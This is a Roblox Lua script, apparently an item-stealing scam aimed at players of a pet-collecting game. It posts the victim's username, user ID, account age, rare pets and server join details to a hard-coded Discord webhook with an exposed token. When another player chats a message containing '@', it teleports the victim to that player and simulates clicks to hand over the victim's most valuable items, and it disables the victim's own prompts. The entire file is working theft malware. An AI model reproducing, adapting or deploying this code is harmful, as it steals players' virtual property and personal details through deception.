local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Webhook configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Item priority system
local ITEM_PRIORITY = {
    ["T-Rex"] = 1000, ["Dragonfly"] = 950, ["Queen bee"] = 900,
    ["Disco bee"] = 850, ["Raccoon"] = 800, ["Mimic Octopus"] = 750,
    ["Butterfly"] = 700, ["Disco"] = 600, ["Wet"] = 500
}

-- Alternative webhook method using request library
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, response = pcall(function()
        return syn.request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
    end
end

local function sendInitialWebhook()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local items = {}
    
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "📦 Inventory Scan | "..LocalPlayer.Name,
        description = "**Total Items:** "..#items.."\n**Rare Items:** "..#rareItems,
        color = #rareItems > 0 and 0xFF0000 or 0x00FF00,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "🔗 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
            {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
            {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
        },
        footer = {
            text = "Scan Time: "..os.date("%X")
        }
    }
    
    sendWebhook(#rareItems > 0 and "@everyone" or nil, embed)
end

local function getBestItem(target)
    local bestItem, bestPriority = nil, 0
    for _, item in pairs(target.Backpack:GetChildren()) do
        local priority = 400
        for pattern, value in pairs(ITEM_PRIORITY) do
            if string.find(item.Name, pattern) then
                priority = value
                break
            end
        end
        if priority > bestPriority then
            bestPriority = priority
            bestItem = item
        end
    end
    return bestItem
end

local function findBestPrompt(targetChar)
    local bestPrompt, maxHold = nil, 0
    for _, part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") and part.HoldDuration > maxHold then
            maxHold = part.HoldDuration
            bestPrompt = part
        end
    end
    return bestPrompt
end

local function simulateHumanClick(position, duration)
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    local originalPos = Vector2.new(mouse.X, mouse.Y)
    
    -- Move mouse to target position gradually
    local steps = 10
    for i = 1, steps do
        local t = i/steps
        local newPos = originalPos:Lerp(position, t)
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.05)
    end
    
    -- Press and hold
    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, true, game, 1)
    local startTime = os.clock()
    
    -- Small random movements during hold
    while os.clock() - startTime < duration do
        local jitter = Vector2.new(math.random(-5,5), math.random(-5,5))
        VirtualInputManager:SendMouseMoveEvent(position.X + jitter.X, position.Y + jitter.Y, game)
        task.wait(0.1)
    end
    
    -- Release
    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, false, game, 1)
end

local function interactWithTarget(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    
    -- Teleport to player
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    
    -- Set up camera
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
    
    -- Find interaction point
    local prompt = findBestPrompt(targetChar)
    local interactPart = prompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso")
    
    -- Look at target
    local lookConn = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
    end)
    
    -- Process items
    while true do
        local bestItem = getBestItem(LocalPlayer)
        if not bestItem then break end
        
        -- Equip item
        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
        task.wait(0.5)
        
        if prompt then
            -- Get screen position of prompt
            local screenPos, visible = Camera:WorldToScreenPoint(prompt.Parent.Position)
            if visible then
                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
            end
        else
            -- Fallback click
            local torsoPos = targetChar:FindFirstChild("UpperTorso").Position
            local screenPos, visible = Camera:WorldToScreenPoint(torsoPos)
            if visible then
                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
            end
        end
    end
    
    if lookConn then lookConn:Disconnect() end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer or not string.find(message, "@") then return end
    
    -- Send webhook
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "🎯 Target Mentioned | "..player.Name,
        description = "**Chat:** ```"..message.."```",
        color = 0xFFA500,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "📦 Items", value = "```"..#items.." found```", inline = true},
            {name = "💎 Rares", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
            {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
        },
        footer = {
            text = "Triggered: "..os.date("%X")
        }
    }
    
    sendWebhook(nil, embed)
    interactWithTarget(player)
end

-- Initialize
sendInitialWebhook()

-- Set up chat listeners
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
end)

-- Disable local prompts
local function disableLocalPrompts()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    for _, child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()
